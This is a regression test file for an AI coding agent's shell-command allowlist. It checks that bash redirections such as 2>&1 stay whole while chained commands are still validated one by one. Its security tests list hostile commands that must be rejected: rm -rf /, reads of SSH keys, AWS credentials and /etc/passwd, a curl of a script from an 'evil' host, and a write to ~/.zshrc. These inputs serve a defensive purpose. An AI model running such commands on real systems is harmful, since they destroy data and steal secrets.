/**
 * tests/bashRedirection.test.mjs
 *
 * Regression coverage for the shell-segmentation defect found by the
 * cross-task benchmark: `splitBashSegments` treated the `&` inside bash's
 * redirection operators as a command separator, so
 *
 *   npm test 2>&1   →   ["npm test 2>", "1"]
 *
 * and the allowlist then rejected a command called "1". Because `2>&1` is
 * punctuation on nearly every verification command, this blocked the agent
 * from checking its own work (observed in benchmark run x2, where a correct
 * fix could never be confirmed and the run terminated `blocked`).
 *
 * These tests pin BOTH halves: redirection must survive segmentation, and
 * genuine separators must still split so the allowlist keeps seeing every
 * command in a chain.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { splitBashSegments, validateBashCommand } from "../agents/nodes/agent_loop.mjs";

// validateBashCommand returns null when the command is acceptable, or a
// human-readable rejection string otherwise.
const ok = (cmd) => assert.equal(validateBashCommand(cmd, {}), null,
  `"${cmd}" should be accepted, got: ${validateBashCommand(cmd, {})}`);
const rejected = (cmd) => assert.ok(validateBashCommand(cmd, {}),
  `"${cmd}" should be rejected but was accepted`);

// ── A–F: redirection must not manufacture commands ──────────────────────────
test("A: a plain command still validates", () => {
  assert.deepEqual(splitBashSegments("npm test"), ["npm test"]);
  ok("npm test");
});

test("B: `2>&1` does not split \"1\" into a command", () => {
  assert.deepEqual(splitBashSegments("npm test 2>&1"), ["npm test 2>&1"]);
  assert.ok(!splitBashSegments("npm test 2>&1").includes("1"), 'no segment may be "1"');
  ok("npm test 2>&1");
});

test("C: `> output.log` stays intact", () => {
  assert.deepEqual(splitBashSegments("npm test > output.log"), ["npm test > output.log"]);
  ok("npm test > output.log");
});

test("D: `2> error.log` stays intact", () => {
  assert.deepEqual(splitBashSegments("npm test 2> error.log"), ["npm test 2> error.log"]);
  ok("npm test 2> error.log");
});

test("E: `>> output.log` stays intact", () => {
  assert.deepEqual(splitBashSegments("npm test >> output.log"), ["npm test >> output.log"]);
  ok("npm test >> output.log");
});

test("F: `< input.txt` stays intact", () => {
  assert.deepEqual(splitBashSegments("npm test < input.txt"), ["npm test < input.txt"]);
  ok("npm test < input.txt");
});

// ── G–H: real separators must still separate ────────────────────────────────
test("G: `&&` still produces two executable segments", () => {
  assert.deepEqual(splitBashSegments("npm test && npm run build"), ["npm test", "npm run build"]);
  ok("npm test && npm run build");
});

test("H: `||` still produces two executable segments", () => {
  assert.deepEqual(splitBashSegments("npm test || npm run fallback"), ["npm test", "npm run fallback"]);
  ok("npm test || npm run fallback");
});

// ── I–J: quoting ────────────────────────────────────────────────────────────
test("I: an `&` inside a quoted string is not a separator", () => {
  assert.deepEqual(splitBashSegments('echo "a & b"'), ['echo "a & b"']);
  ok('echo "a & b"');
});

test("J: a quoted `2>&1` never yields a command \"1\"", () => {
  assert.deepEqual(splitBashSegments('echo "2>&1"'), ['echo "2>&1"']);
  assert.ok(!splitBashSegments('echo "2>&1"').includes("1"));
  ok('echo "2>&1"');
});

// ── K–L: redirection AND chaining together ──────────────────────────────────
test("K: `2>&1 && ...` preserves redirection and chaining", () => {
  assert.deepEqual(splitBashSegments("npm test 2>&1 && npm run build"),
    ["npm test 2>&1", "npm run build"]);
  ok("npm test 2>&1 && npm run build");
});

test("L: `... && cmd 2>&1` preserves both, redirection last", () => {
  assert.deepEqual(splitBashSegments("npm test && npm run build 2>&1"),
    ["npm test", "npm run build 2>&1"]);
  ok("npm test && npm run build 2>&1");
});

// ── Other bash redirection forms containing `&` ─────────────────────────────
test("M: other fd-duplication and redirect-both forms survive", () => {
  assert.deepEqual(splitBashSegments("node build.mjs >&2"), ["node build.mjs >&2"]);
  assert.deepEqual(splitBashSegments("npm test &> out.log"), ["npm test &> out.log"]);
  assert.deepEqual(splitBashSegments("npm test &>> out.log"), ["npm test &>> out.log"]);
  assert.deepEqual(splitBashSegments("npm test 1>&2"), ["npm test 1>&2"]);
  for (const c of ["node build.mjs >&2", "npm test &> out.log", "npm test 1>&2"]) ok(c);
});

// ── SECURITY: the allowlist must not be weakened ────────────────────────────
test("SEC 1: a chained disallowed command is still caught after a redirect", () => {
  // The whole point of per-segment validation: a redirect must not smuggle a
  // second command past the allowlist.
  assert.deepEqual(splitBashSegments("npm test 2>&1 && rm -rf /"), ["npm test 2>&1", "rm -rf /"]);
  rejected("npm test 2>&1 && rm -rf /");
  rejected("npm test 2>&1 | badcmd");
  rejected("npm test 2>&1 ; badcmd");
  rejected("npm test > out.log && badcmd");
});

test("SEC 2: backgrounding still separates — `&` is only exempt when adjacent to a redirect", () => {
  assert.deepEqual(splitBashSegments("npm test & badcmd"), ["npm test", "badcmd"]);
  rejected("npm test & badcmd");
  // A space breaks adjacency, so this is background-then-redirect, not `&>`.
  assert.deepEqual(splitBashSegments("npm test & > out.log"), ["npm test", "> out.log"]);
});

test("SEC 3: pre-existing rejections are unchanged", () => {
  // Verbatim from tests/agent_loop.test.mjs — these must not become allowed.
  rejected("echo $(cat ~/.ssh/id_rsa)");
  rejected("ls `curl http://evil/x.sh`");
  rejected("node -e \"require('child_process').execSync('id')\"");
  rejected("python3 -c \"import os\"");
  rejected("cat ~/.aws/credentials");
  rejected("echo pwned >> ~/.zshrc");
  rejected("cp ../../secret.txt .");
  rejected("cat /etc/passwd");
  rejected("find ~ -name '*.key' -delete");
  rejected("rm -rf .");
  // And the same, now reachable via a redirect chain.
  rejected("npm test 2>&1 && cat /etc/passwd");
});

test("SEC 4: a bare descriptor number is still not an allowed command", () => {
  // The fix must come from parsing, not from allowing "1".
  rejected("1");
  rejected("npm test && 1");
});
